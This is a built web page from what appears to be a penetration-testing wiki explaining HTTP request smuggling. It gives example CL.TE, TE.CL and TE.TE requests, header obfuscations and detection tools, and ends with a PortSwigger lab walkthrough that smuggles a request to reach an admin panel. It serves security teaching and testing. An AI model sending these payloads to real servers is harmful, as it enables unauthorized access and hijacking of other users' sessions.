import{_ as p,c,a5 as i,G as a,w as t,B as o,o as d,j as e,a as n}from"./chunks/framework.B5CpDqM0.js";const u="/assets/Request%20smuggling%20overview.CLH_RzPA.png",h="/assets/spidersec_recap.GTGwFtc1.png",g="/assets/RSPOC2.CFziF5J1.png",b="/assets/RSPOC1.CiiSD4-M.png",m="/assets/RSPOC3.COl6eSJL.png",E=JSON.parse('{"title":"HTTP request smuggling","description":"","frontmatter":{"authors":"ShutdownRepo, fransosiche"},"headers":[],"relativePath":"web/config/http-request-smuggling/index.md","filePath":"web/config/http-request-smuggling/index.md","lastUpdated":1724982529000}'),f={name:"web/config/http-request-smuggling/index.md"};function T(k,s,y,q,w,v){const l=o("PluginTabsTab"),r=o("PluginTabs");return d(),c("div",null,[s[5]||(s[5]=i('<h1 id="http-request-smuggling" tabindex="-1">HTTP request smuggling <a class="header-anchor" href="#http-request-smuggling" aria-label="Permalink to &quot;HTTP request smuggling&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>HTTP request smuggling takes advantage of discrepancies in parsing non-RFC compliant HTTP requests through two HTTP devices (i.e. a back-end server and a HTTP-aware firewall or front-end proxy). The HTTP request smuggling process is performed by constructing multiple customized HTTP requests. This allows two target entities to see two different sets of requests.</p><p>In fact, users send requests to a front-end server that will forward them to a back-end server. Therefore, requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins. In this case, the front-end and the back-end need to agree about the boundaries between requests. Otherwise an attacker might be able to send an ambiguous request.</p><p class="caption"><img src="'+u+'" alt=""> HTTP request smuggling process (based on <a href="https://blog.detectify.com/industry-insights/hiding-in-plain-sight-http-request-smuggling/" target="_blank" rel="noreferrer">detectify</a>&#39;s diagram)</p><p>HTTP request smuggling happens because the HTTP specification provides two different ways to specify where a request ends:</p><ul><li>the <code>Content-Length</code> header: the length of the message body is specified in bytes (<code>\\r\\n</code> included).</li><li>and the <code>Transfer-Encoding</code> header: the length of chunk in bytes (hexadecimal encoding, <code>\\r\\n</code> included)</li></ul><p>HTTP request smuggling vulnerability occurs when an attacker sends both headers in a single request. This can cause either the front-end or the back-end server to incorrectly interpret the request, passing through a malicious HTTP query.</p><p>Performing a request smuggling attack can lead to :</p><ul><li>Gain access to protected resources, such as admin consoles, or sensitive data</li><li>Hijack sessions of web users, as well as credentials</li><li>Conduct cross-site scripting (XSS) attacks without requiring any action from the user</li></ul>',10)),a(r,null,{default:t(()=>[a(l,{label:"CL.TE"},{default:t(()=>s[0]||(s[0]=[e("h3",{id:"content-length-transfer-encoding-cl-te",tabindex:"-1"},[n("Content-Length.Transfer-Encoding (CL.TE) "),e("a",{class:"header-anchor",href:"#content-length-transfer-encoding-cl-te","aria-label":'Permalink to "Content-Length.Transfer-Encoding (CL.TE)"'},"​")],-1),e("p",null,[n("In "),e("code",null,"CL.TE"),n(" RS (Request Smuggling) the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. We can craft the follow HTTP request :")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"POST / HTTP/1.1")]),n(`
`),e("span",{class:"line"},[e("span",null,"Host: vulnerable-website.com")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Length: 13")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span",null," ")]),n(`
`),e("span",{class:"line"},[e("span",null,"0")]),n(`
`),e("span",{class:"line"},[e("span",null,"MALICIOUS-REQUEST")])])])],-1),e("p",null,[n("Further explanation will be given in the "),e("a",{href:"#practice"},"practice"),n(" part.")],-1)])),_:1}),a(l,{label:"TE.CL"},{default:t(()=>s[1]||(s[1]=[e("h3",{id:"transfer-encoding-content-length-te-cl",tabindex:"-1"},[n("Transfer-Encoding.Content-Length (TE.CL) "),e("a",{class:"header-anchor",href:"#transfer-encoding-content-length-te-cl","aria-label":'Permalink to "Transfer-Encoding.Content-Length (TE.CL)"'},"​")],-1),e("p",null,[n("In "),e("code",null,"TE.CL"),n(" RS (Request Smuggling) the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can craft the follow HTTP request to exploit :")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"POST / HTTP/1.1")]),n(`
`),e("span",{class:"line"},[e("span",null,"Host: vulnerable-website.com")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Length: 3")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span")]),n(`
`),e("span",{class:"line"},[e("span",null,"15")]),n(`
`),e("span",{class:"line"},[e("span")]),n(`
`),e("span",{class:"line"},[e("span",null,"MALICIOUS-REQUEST")]),n(`
`),e("span",{class:"line"},[e("span")]),n(`
`),e("span",{class:"line"},[e("span",null,"0")])])])],-1),e("p",null,"Further explanation will be given in the practice part.",-1)])),_:1}),a(l,{label:"TE.TE"},{default:t(()=>s[2]||(s[2]=[e("h3",{id:"transfer-encoding-transfer-encoding-te-te",tabindex:"-1"},[n("Transfer-Encoding.Transfer-Encoding (TE.TE) "),e("a",{class:"header-anchor",href:"#transfer-encoding-transfer-encoding-te-te","aria-label":'Permalink to "Transfer-Encoding.Transfer-Encoding (TE.TE)"'},"​")],-1),e("p",null,"When the front-end and back-end both support Transfer-Encoding header, you can obfuscate one the TE header so one of the server will be induced not to process the request. Here are ways to obfuscate the Transfer-Encoding header :",-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"Transfer-Encoding: xchunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding : chunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding: x")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding:[tab]chunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"[space]Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"X: X[\\n]Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding")]),n(`
`),e("span",{class:"line"},[e("span",null,": chunked")])])])],-1),e("p",null,[n("Below is a summary table made by "),e("a",{href:"https://twitter.com/SpiderSec",target:"_blank",rel:"noreferrer"},"spiderse")],-1),e("p",null,[e("img",{src:h,alt:""}),e("a",{href:"https://twitter.com/SpiderSec/status/1200413390339887104",target:"_blank",rel:"noreferrer"},"https://twitter.com/SpiderSec/status/1200413390339887104")],-1)])),_:1})]),_:1}),s[6]||(s[6]=i('<h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>In order to identify if the target is vulnerable to HTTP request smuggling, testers need to answer the following questions:</p><ul><li>Is there a front-end and a back-end ?</li><li>Are they are using <code>CL.TE</code> or <code>TE.CL</code> or <code>TE.TE</code> ? This can be answered <a href="#using-burp-suite">using Burp</a>, <a href="#using-smuggler.py">smuggler.py</a> or manually in a &quot;die and retry&quot; manner.</li><li>If <code>HTTP/2</code> is used, can the session be downgraded it to perform <code>H2.CL</code> or <code>H2.TE</code> ? <a href="https://github.com/neex/http2smugl" target="_blank" rel="noreferrer">http2smugl</a> (Python) can be used to detect this, with the <code>http2smugl detect $URL</code> command</li><li>Can differentials responses be triggered when a request is smuggled and sent multiple times ?</li><li>Can timing delays be triggered in responses when a request is smuggled and sent multiple times?</li></ul><p>The last two questions can be answered by conducting the tests explained below.</p>',4)),a(r,null,{default:t(()=>[a(l,{label:"Time delays"},{default:t(()=>s[3]||(s[3]=[e("p",null,[n("One way to identify Request Smuggling is the time delay after sending this "),e("code",null,"CL.TE"),n(" request (this technique can also be used for "),e("code",null,"TE.CL"),n(") for example :")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"POST / HTTP/1.1")]),n(`
`),e("span",{class:"line"},[e("span",null,"Host: vulnerable-website.com")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Length: 4")]),n(`
`),e("span",{class:"line"},[e("span")]),n(`
`),e("span",{class:"line"},[e("span",null,"1")]),n(`
`),e("span",{class:"line"},[e("span",null,"A")]),n(`
`),e("span",{class:"line"},[e("span",null,"X")])])])],-1),e("p",null,[n("In this request, the front end uses the "),e("code",null,"Content-Length"),n(" header, so it will forward 4 bytes of this request, omitting the "),e("code",null,"X"),n(". The back-end, using the Transfer-Encoding header, will processes the first chunk and waits for the next, this will cause a huge time delay.")],-1)])),_:1}),a(l,{label:"Differential responses"},{default:t(()=>s[4]||(s[4]=[e("p",null,"After identifying a probable request smuggling vulnerability, you can try to trigger differences in the contents of the application's responses. This involves sending two requests to the application in quick succession:",-1),e("ul",null,[e("li",null,'An "attack" request that is designed to interfere with the processing of the next request.'),e("li",null,'A "normal" request.')],-1),e("p",null,[n("Here is an example with a "),e("code",null,"TE.CL"),n(" :")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"POST /search HTTP/1.1")]),n(`
`),e("span",{class:"line"},[e("span",null,"Host: vulnerable-website.com")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Type: application/x-www-form-urlencoded")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Length: 4")]),n(`
`),e("span",{class:"line"},[e("span",null,"Transfer-Encoding: chunked")]),n(`
`),e("span",{class:"line"},[e("span")]),n(`
`),e("span",{class:"line"},[e("span",null,"7c")]),n(`
`),e("span",{class:"line"},[e("span",null,"GET /404 HTTP/1.1")]),n(`
`),e("span",{class:"line"},[e("span",null,"Host: vulnerable-website.com")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Type: application/x-www-form-urlencoded")]),n(`
`),e("span",{class:"line"},[e("span",null,"Content-Length: 144")]),n(`
`),e("span",{class:"line"},[e("span")]),n(`
`),e("span",{class:"line"},[e("span",null,"x=")]),n(`
`),e("span",{class:"line"},[e("span",null,"0")])])])],-1),e("p",null,[n("In this case, the front-end processes the "),e("code",null,"Transfer-Encoding"),n(" header and does the following operations")],-1),e("ul",null,[e("li",null,[n("handles the message body as using chunked encoding which is stated 124 ("),e("code",null,"0x7c"),n(") bytes long")]),e("li",null,"reads up to the beginning of the line following the second request"),e("li",null,"processes the second chunk, which is stated to be empty (since it ends with a 0)"),e("li",null,"finishes parsing the request")],-1),e("p",null,[n("This request is forwarded to the back-end server. The back-end uses the "),e("code",null,"Content-Length"),n(" header and does the following operations")],-1),e("ul",null,[e("li",null,[n("determines that the request is 4 bytes long (meaning it stops reading at the start of the line following "),e("code",null,"7c"),n(").")]),e("li",null,[n("The following bytes, starting with "),e("code",null,"GET"),n(", are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence and thus return a 404 status code.")])],-1),e("div",{class:"caution custom-block"},[e("p",null,[n('When using the Burp Repeater, testers must always ensure that the "Update Content-Length" option is unchecked for '),e("code",null,"TE.CL"),n(" since modifying the "),e("code",null,"Content-Length"),n(" is required to trigger the vulnerability. The trailing sequence "),e("code",null,"\\r\\n\\r\\n"),n(" must be included following the final 0.")])],-1)])),_:1})]),_:1}),s[7]||(s[7]=i(`<h3 id="using-smuggler-py" tabindex="-1">Using smuggler.py <a class="header-anchor" href="#using-smuggler-py" aria-label="Permalink to &quot;Using smuggler.py&quot;">​</a></h3><p>Tools like <a href="https://github.com/defparam/smuggler" target="_blank" rel="noreferrer">smuggler.py</a> (Python) can be used to identify potential HTTP request smuggling vulnerabilities.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># for a single host</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">smuggler.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># for a list of hosts</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> list_of_hosts.txt</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> python3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smuggler.py</span></span></code></pre></div><p class="caption"><img src="`+g+'" alt=""> screenshot example of smuggler.py</p><h3 id="using-burp-suite" tabindex="-1">Using Burp Suite <a class="header-anchor" href="#using-burp-suite" aria-label="Permalink to &quot;Using Burp Suite&quot;">​</a></h3><div class="tip custom-block"><p>The <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank" rel="noreferrer">HTTP Request Smuggler</a> extension on the <a href="https://portswigger.net/bappstore" target="_blank" rel="noreferrer">BApp Store</a> is used in the following example.</p></div><p>The <code>scan</code> option can be used to</p><ul><li>scan for possible HTTP Request Smuggling</li><li>or launch an &quot;auto smuggle&quot; with <code>Smuggle Prob</code> option (Burp Suite Collaborator is required to do that)</li></ul><p>If <code>Smuggle Prob</code> didn&#39;t manage to exploit HTTP Request Smuggling but identified it, or if manual request smuggling operations were started in the <code>repeater tab</code>:</p><ul><li>Use the turbo intruder -&gt; right click on the request -&gt; Extensions -&gt; HTTP Request Smuggler -&gt; Smuggle Attack (<code>CL.TE</code> or <code>TE.CL</code>, depending on what the manual operations or <code>Smuggle Prob</code> identified)</li></ul><p>In the screenshot below, a <code>CL.TE</code> Request Smuggling type was identified. Access to the admin panel is attempted. The prefix was changed. The prefix will be the &quot;smuggle&quot; part of the request.</p><p><img src="'+b+'" alt=""></p><p>The turbo intruder helps by <code>finding the right Content-length header</code> to smuggle the attack properly (n.b. this part is always tricky to perform).</p><p><img src="'+m+`" alt=""></p><p>Admin panel was accessed properly.</p><details class="details custom-block"><summary>Scenario example: TE.CL exploit on PortSwigger Lab</summary><p>Goal here is to access the admin panel</p><p>The following is the initial request that will be modified for request smuggling attacks.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>GET / HTTP/1.1</span></span>
<span class="line"><span>Host: 0af2004803e19d8dc040db3100680078.web-security-academy.net</span></span>
<span class="line"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span></span>
<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="line"><span>Accept-Language: en-US,en;q=0.5</span></span>
<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span>Referer: https://portswigger.net/</span></span>
<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span>Sec-Fetch-Dest: document</span></span>
<span class="line"><span>Sec-Fetch-Mode: navigate</span></span>
<span class="line"><span>Sec-Fetch-Site: cross-site</span></span>
<span class="line"><span>Sec-Fetch-User: ?1</span></span>
<span class="line"><span>Te: trailers</span></span>
<span class="line"><span>Connection: close</span></span></code></pre></div><h3 id="identify-the-vulnerability" tabindex="-1">Identify the vulnerability <a class="header-anchor" href="#identify-the-vulnerability" aria-label="Permalink to &quot;Identify the vulnerability&quot;">​</a></h3><p>In order to identify the vulnerability, multiple solutions are possible</p><ul><li>HTTP Request Smuggler Extension</li><li>Manual requesting with &quot;differential responses&quot; or &quot;timings techniques&quot;</li><li>With <a href="https://github.com/gwen001/pentest-tools/blob/master/smuggler.py" target="_blank" rel="noreferrer">smuggler.py</a></li></ul><h3 id="smuggle-the-request" tabindex="-1">Smuggle the request <a class="header-anchor" href="#smuggle-the-request" aria-label="Permalink to &quot;Smuggle the request&quot;">​</a></h3><p>An attempt to smuggle the request is made by changing the <code>GET</code> to <code>POST</code> and adding <code>Transfer-Encoding</code> and <code>Content-Length</code> Header. In Burp, the option &quot;update content length&quot; must be unchecked, and <code>\\r\\n\\r\\n</code> must be added after the final <code>0</code> for the <code>TE.CL</code> request smuggling.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>POST / HTTP/1.1</span></span>
<span class="line"><span>Host: 0af2004803e19d8dc040db3100680078.web-security-academy.net</span></span>
<span class="line"><span>Content-length: 4</span></span>
<span class="line"><span>Transfer-Encoding: chunked</span></span>
<span class="line"><span></span></span>
<span class="line"><span>60</span></span>
<span class="line"><span>POST /admin HTTP/1.1</span></span>
<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span>Content-Length: 15</span></span>
<span class="line"><span></span></span>
<span class="line"><span>x=1</span></span>
<span class="line"><span>0</span></span></code></pre></div><h3 id="adding-the-host-header" tabindex="-1">Adding the <code>Host</code> header <a class="header-anchor" href="#adding-the-host-header" aria-label="Permalink to &quot;Adding the \`Host\` header&quot;">​</a></h3><p>A problem arises. the back-end blocks the request. In fact, in this case, the back-end needs the header <code>Host: localhost</code> for the second request. The byte&#39;s number needs to be changed accordingly. Using this request, access to the admin panel is obtained.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>POST / HTTP/1.1</span></span>
<span class="line"><span>Host: 0af2004803e19d8dc040db3100680078.web-security-academy.net</span></span>
<span class="line"><span>Content-length: 4</span></span>
<span class="line"><span>Transfer-Encoding: chunked</span></span>
<span class="line"><span></span></span>
<span class="line"><span>71</span></span>
<span class="line"><span>POST /admin HTTP/1.1</span></span>
<span class="line"><span>Host: localhost</span></span>
<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span>Content-Length: 15</span></span>
<span class="line"><span></span></span>
<span class="line"><span>x=1</span></span>
<span class="line"><span>0</span></span></code></pre></div></details><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://github.com/gwen001/pentest-tools/blob/master/smuggler.py" target="_blank" rel="noreferrer">https://github.com/gwen001/pentest-tools/blob/master/smuggler.py</a></p><p><a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank" rel="noreferrer">https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646</a></p><p><a href="https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling" target="_blank" rel="noreferrer">https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling</a></p><p><a href="https://portswigger.net/web-security/request-smuggling/" target="_blank" rel="noreferrer">https://portswigger.net/web-security/request-smuggling/</a></p><p><a href="https://www.imperva.com/learn/application-security/http-request-smuggling/" target="_blank" rel="noreferrer">https://www.imperva.com/learn/application-security/http-request-smuggling/</a></p>`,22))])}const P=p(f,[["render",T]]);export{E as __pageData,P as default};
